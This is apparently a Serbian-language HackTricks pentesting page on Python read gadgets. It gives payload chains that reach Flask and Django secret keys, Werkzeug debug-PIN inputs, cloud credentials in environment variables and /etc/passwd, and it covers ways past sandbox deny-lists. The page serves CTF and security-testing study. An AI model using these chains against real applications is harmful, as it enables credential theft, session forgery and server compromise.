# Gadžeti za interno čitanje u Pythonu

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Različite ranjivosti kao što su [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ili [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) mogu da vam omoguće da **čitate interne podatke Pythona, ali vam neće omogućiti izvršavanje koda**. Zbog toga će pentester morati da maksimalno iskoristi ove dozvole za čitanje kako bi **dobio osetljive privilegije i eskalirao ranjivost**.

### Flask - Čitanje tajnog ključa

Glavna stranica Flask aplikacije verovatno će imati globalni objekat **`app`**, u kojem je **tajna vrednost konfigurisana**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
U ovom slučaju moguće je pristupiti ovom objektu koristeći bilo koji gadget za **pristup globalnim objektima** sa stranice [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

U slučaju da se **vulnerability nalazi u drugom Python fajlu**, potreban vam je gadget za prolazak kroz fajlove kako biste došli do glavnog fajla i **pristupili globalnom objektu `app.secret_key`**, a zatim mogli da [**eskalirate privilegije** poznavajući ovaj ključ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload poput ovog [iz ovog writeup-a](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Koristite ovaj payload da biste **pročitali `app.secret_key`**. Ako originalni bug takođe omogućava write primitive (na primer, class pollution), isti path može da se koristi za zamenu ove vrednosti i potpisivanje privilegovanijih Flask cookie-ja.

### Werkzeug - machine_id i node uuid

[**Koristeći ove payload-e iz ovog writeup-a**](https://vozec.fr/writeups/tweedle-dum-dee/) moći ćete da pristupite vrednostima **machine_id** i **uuid** čvora, koje predstavljaju **private bits** potrebne za [**generisanje Werkzeug pina**](../../network-services-pentesting/pentesting-web/werkzeug.md) i pristup Python konzoli na `/console` ako je **debug mode omogućen**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Imajte na umu da možete dobiti **lokalnu putanju servera do datoteke `app.py`** generisanjem neke **greške** na web stranici koja će vam **prikazati putanju**.

Ako se ranjivost nalazi u drugoj Python datoteci, proverite prethodni Flask trik za pristup objektima iz glavne Python datoteke.

### Django - SECRET_KEY i settings modul

Django settings objekat se kešira u `sys.modules` nakon pokretanja aplikacije. Uz samo primitive za čitanje možete otkriti **`SECRET_KEY`**, rezervne ključeve, kredencijale baze podataka ili saltove za potpisivanje:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Ako se ranjivi gadget nalazi u drugom modulu, prvo prođite kroz globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` su jednako vredni kao i trenutni `SECRET_KEY`: i dalje validiraju stare potpisane vrednosti tokom rotacije.<sup>[[1]](#references)</sup> Takođe leak-ujte `SESSION_ENGINE` i `SESSION_SERIALIZER` da biste brzo utvrdili da li je uticaj ograničen samo na falsifikovanje kolačića ili je nešto ozbiljnije. Za detalje o uticaju na web aplikaciju pogledajte [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Gadgets za učitavanje modula - čitanje izvornog koda i datoteka

Učitani Python moduli obično zadržavaju `__loader__`. Loader-i zasnovani na datotekama često izlažu `get_source()` i `get_data()`, što predstavlja savršene **primitive samo za čitanje** kada već možete da dođete do objekta modula, ali ne i do `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Ovo je veoma korisno za dumpovanje **config modula, blueprint-a, helper fajlova ili skrivenih ruta** i pronalaženje API ključeva, DSN-ova, putanja do flagova ili dodatnih gadget entry point-a.

Ako imate samo enumeraciju podklasa, pretražite loader po imenu umesto hardkodovanja indeksa:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals u generator / coroutine frame-u

Ako možete da kreirate ili dosegnete generator/coroutine objekat, njegov frame može da otkrije globals **bez potrebe za bilo kakvim function `__globals__` gadgetom**. Ovo je korisno protiv filtera koji blokiraju samo dunder imena, a zaboravljaju frame atribute kao što su `gi_frame`, `ag_frame`, `cr_frame` ili `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Kada dođete do globalnih promenljivih okvira, nastavite potpuno isto kao kod drugih gadgeta (`sys.modules`, objekti podešavanja, `os.environ`, itd.). Nedavni sandbox escapes stalno ponovo otkrivaju ovo zato što `gi_frame` i `f_globals` nisu dunder atributi i često prežive naivne deny-liste.

### Environment variables / cloud creds via loaded modules

Mnogi jail-ovi i dalje negde importuju `os` ili `sys`. Možete zloupotrebiti bilo koju dostupnu funkciju `__init__.__globals__` da biste se prebacili na već importovani modul `os` i izlistali **environment variables** koje sadrže API tokene, cloud ključeve ili zastavice:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Ako se indeks podklase filtrira, koristite učitavače:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables su često jedine tajne potrebne za prelazak sa read na full compromise (cloud IAM ključevi, database URL-ovi, signing keys itd.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), pogođene verzije `<0.61.0`) omogućavao je **class pollution** putem posebno kreiranih component requestova. Property path kao što je `__init__.__globals__` mogao je da dođe do globals komponentnog modula i importovanih modula; advisory pokazuje prepisivanje Django `SECRET_KEY` vrednosti i vrednosti u `os.environ`, a ne read-only exploit.<sup>[[5]](#references)</sup> Ako odvojeni bug obezbeđuje read access do istog object grapha, ti globals mogu otkriti konfiguraciju i credentials bez potrebe za code execution.

### Gadget kolekcije za chaining

Nedavni CTF-ovi i pyjail istraživanja pokazuju pouzdane read chains izgrađene isključivo pomoću attribute access-a i subclass enumeration-a. Community-maintained liste kao što je [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) katalogizuju stotine minimalnih gadgeta koje možete kombinovati za kretanje od objekata do `__globals__`, `sys.modules` i, na kraju, osetljivih podataka.<sup>[[2]](#references)</sup> Dajte prednost pretragama zasnovanim na atributima/nazivima u odnosu na raw subclass indexes, zato što se pozicija `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itd. menja između Python verzija i sa dodatnim importovanim bibliotekama.

## References

- [1] [Django dokumentacija o kriptografskom potpisivanju](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki o Python sandbox gadgetima](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn ranjivost Class Pollution, koja dovodi do RCE, XSS, DoS i zaobilaženja autentikacije (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
